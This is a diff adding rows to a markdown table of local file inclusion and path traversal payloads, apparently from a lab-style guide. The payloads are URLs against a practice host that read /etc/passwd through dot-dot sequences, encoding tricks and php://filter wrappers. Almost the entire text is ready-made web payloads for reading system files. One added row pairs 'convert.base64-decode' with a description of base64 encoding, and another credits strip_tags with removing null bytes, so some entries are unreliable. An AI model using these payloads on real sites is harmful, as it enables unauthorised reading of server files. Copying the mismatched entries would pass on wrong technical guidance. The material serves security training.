@@ -170,3 +170,8 @@ Here are some basic payloads that can be tried:
 | `http://mysite.thm/test.php?path=..\\..\\..\\..\\etc\\hosts` | For Windows targets or ones that did a poor job with input sanitation. |
 | `http://mysite.thm/test.php?path=....//....//....//....//etc/passwd` | This is called dot padding and it can bypass some naive regex checks. |
 | `http://mysite.thm/test.php?path=\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd` | This uses Unicode escapes. |
+| `http://mysite.thm/test.php?path=php://filter/convert.base64-decode/resource=../../../../etc/passwd` | Base64 encode the contents of the file and return it. |
+| `http://mysite.thm/test.php?path=php://filter/string.rot13//resource=../../../../etc/passwd` | Use ROT 13 encryption on the contents of the file and return it. |
+| `http://mysite.thm/test.php?path=php://filter/string.toupper/resource=../../../../etc/passwd` | Convert the contents of the file to uppercase and return it. |
+| `http://mysite.thm/test.php?path=php://filter/string.tolower/resource=../../../../etc/passwd` | Convert the contents of the file to lowercase and return it. |
+| `http://mysite.thm/test.php?path=php://filter/string.strip_tags/resource=../../../../etc/passwd` | Remove null bytes, html and php tags from the contents of the file and return it. |
